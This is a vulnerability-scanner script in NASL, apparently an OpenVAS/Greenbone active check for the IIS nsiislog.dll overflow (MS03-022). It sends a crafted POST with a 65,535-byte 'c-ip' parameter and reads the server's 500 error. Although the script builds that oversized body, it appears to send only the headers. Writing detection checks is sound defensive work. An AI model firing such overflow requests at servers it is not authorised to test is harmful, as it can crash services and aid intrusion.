# SPDX-FileCopyrightText: 2009 Christian Eric Edjenguele
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

CPE = "cpe:/a:microsoft:internet_information_services";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.101016");
  script_version("2024-04-30T05:05:26+0000");
  script_tag(name:"last_modification", value:"2024-04-30 05:05:26 +0000 (Tue, 30 Apr 2024)");
  script_tag(name:"creation_date", value:"2009-03-16 23:15:41 +0100 (Mon, 16 Mar 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2003-0349");
  script_name("Microsoft IIS RCE Vulnerability (MS03-022) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Christian Eric Edjenguele");
  script_family("Windows : Microsoft Bulletins");
  script_dependencies("gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("microsoft/iis/http/detected");

  script_tag(name:"summary", value:"Microsoft IIS is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"There is a flaw in the way nsiislog.dll processes incoming
  client requests. A vulnerability exists because an attacker could send specially formed HTTP
  request (communications) to the server that could cause IIS to fail or execute code on the user's
  system.");

  script_tag(name:"solution", value:"Microsoft has released a patch to correct these issues.
  Please see the references for more information.

  Note: This patch can be installed on systems running Microsoft Windows 2000 Service Pack 2,
  Windows 2000 Service Pack 3 and Microsoft Windows 2000 Service Pack 4.

  This patch has been superseded by the one provided in Microsoft Security Bulletin MS03-019.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://learn.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-022");
  script_xref(name:"URL", value:"http://www.microsoft.com/downloads/details.aspx?FamilyId=F772E131-BBC9-4B34-9E78-F71D9742FED8&displaylang=en");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

hostname = http_host_name( port:port );

if( ! soc = open_sock_tcp( port ) )
  exit( 0 );

remote_exe = "";

url = "/scripts/nsiislog.dll";
req = http_get( item:url, port:port );
send( socket:soc, data:req );

reply = recv( socket:soc, length:4096 );

if( reply ) {

  if( "NetShow ISAPI Log Dll" >< reply ) {

    url_args = make_list("date", "time",
                         "c-dns", "cs-uri-stem", "c-starttime", "x-duration", "c-rate",
                         "c-status", "c-playerid",  "c-playerversion", "c-player-language",
                         "cs(User-Agent)", "cs(Referer)", "c-hostexe");

    foreach parameter(url_args)
      remote_exe += parameter + "=vttest&";

    remote_exe += "c-ip=" + crap(65535);

    mpclient = string("POST /", "/scripts/nsiislog.dll", " HTTP/1.0\r\n",
                      "Host: ", hostname, "\r\n",
                      "User-Agent: ", "NSPlayer/2.0", "\r\n",
                      "Content-Type: ", "application/x-www-form-urlencoded", "\r\n",
                      "Content-Length: ",  strlen(remote_exe), "\r\n\r\n");

    send( socket:soc, data:mpclient );
    response = recv( socket:soc, length:4096 );

    if( ( egrep( pattern:"^HTTP/1\.[01] 500", string:response ) ) && ( "The remote procedure call failed. " >< response ) ) {
      close( soc );
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
  close( soc );
  exit( 99 );
}

close( soc );

exit( 0 );
